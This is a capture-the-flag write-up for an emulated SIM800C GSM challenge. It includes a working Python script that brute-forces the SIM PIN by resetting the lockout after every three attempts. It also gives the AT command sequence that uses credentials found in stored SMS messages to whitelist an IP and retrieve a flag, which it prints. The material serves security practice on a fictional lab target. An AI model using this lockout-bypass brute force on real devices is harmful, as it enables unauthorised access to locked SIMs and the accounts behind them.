## Sim of the Dead

We can connect to the instance using nc with the following command:

```bash
nc [ip] 9000
```

from the response we can see that this is an emulator of a SIM800C GSM (https://www.researchdesignlab.com/projects/GSM-SIM800C-Manual.pdf).
These links contain useful commands:
- https://www.waveshare.com/wiki/Template:SIM800C_GSM/GPRS_HAT_User_Manual
- https://www.integral-system.fr/shop/media/product/file/atcommandsapplicationnote201904241-5fc10e94e0488.pdf

Let's see all the messages stored in the sim:

    AT+CMGL="ALL"

ah, the sim is locked with an unknown PIN. We can try bruteforcing it with a script that will try 3 pins, reset the sim, try 3 more and so on.
The following script does the job:

```python
#!/usr/bin/env python3
import socket
import argparse

def hack(host:str, port:int):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host,port))
        sf = s.makefile()
        while True:
            line = sf.readline()
            print(line)
            if line.startswith("[!]Notice"):
                break
        print("Notice received, bruteforcing..")
        for i in range(0,9999):
            si = str(i)
            pi = si.zfill(4)
            print(pi)
            while True:
                sb = f"AT+CPIN={pi}\n"
                s.send(sb.encode())
                line = sf.readline().strip()
                if "SIM LOCKED" in line:
                    print("SIM RESET")
                    s.send(b"+RST+SIM\n")
                    line = ""
                    while not line:
                        line = sf.readline().strip()
                    continue
                break
            if not "ERROR" in line:
                print(f"FOUND: {pi}")
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port",type=int)
    args = parser.parse_args()
    hack(args.host, args.port)
```

We soon find out that the PIN is `4321`.

We can now enter the pin and list all the messages:
```
AT+CPIN=4321
AT+CMGL="ALL"
```
here we will find some details:
```
+CMGL: 2,"REC READ","+39231231231[MARK-OFFICE]","",25/04/06,17:37:00+31
Just a reminder as you keep forgetting how the damn door works:
SEND AN EMAIL to [officedoor@groundstation.gov] from your phone with your password as the ONLY TEXT in the subject.
We will verify your account and allow your IP.
```
```
+CMGL: 4,"REC READ","+3996969696[SNADO-MAIL]","",25/04/06,17:38:00+29
Your email credentials, reachable via the encrypted snadophone network, are:
SMTP:'smtp.snadophone.domain:25'
User: john[at]groundstation[dot]gov
Pass: `ILikeMyPeninsula32`
```
```
+CMGL: 5,"REC SENT","+39231231231[MARK-OFFICE]","",25/04/06,17:39:00+29
Oh and which was the link to open the door?

+CMGL: 6,"REC READ","+39231231231[MARK-OFFICE]","",25/04/06,17:45:00+29
(http://officedoor.groundstation.gov).
And it's not a cup holder.
It's a purple-ray writer. You idiot.
```
```
+CMGL: 8,"REC READ","+39666666666[SNADO-PHONE]","",25/04/06,17:46:00+29
Snado:Phone company
Here you can find your internet configuration, as requested:
Mode: GPRS
APN: `apn.snadophone.domain`
Have a great day!
```
We need to connect to gprs. We can do that with the following commands:
```
AT+SAPBR=3,1,"CONTYPE","GPRS"
AT+SAPBR=3,1,"APN","apn.snadophone.domain"
```
(verify with)
```
AT+SAPBR=1,1
AT+SAPBR=2,1
```
To send the email we can do the following:
```
AT+SMTPSRV="smtp.snadophone.domain",25
AT+SMTPAUTH=1,"john@groundstation.gov","ILikeMyPeninsula32"
AT+SMTPRCPT=0,0,"officedoor@groundstation.gov","test"
AT+SMTPSUB="ILikeMyPeninsula32"
AT+SMTPSEND
```
It will answer with:
```
+SMTPSEND: IP WHITELISTED
```
Finally we can make the http request:
```
AT+HTTPINIT
AT+HTTPPARA="CID",1
AT+HTTPPARA="URL","officedoor.groundstation.gov"
AT+HTTPACTION=0
AT+HTTPREAD
```
The flag will be printed:
```
NTRLGC{D00R_0P3N3D_4_Y0U}
```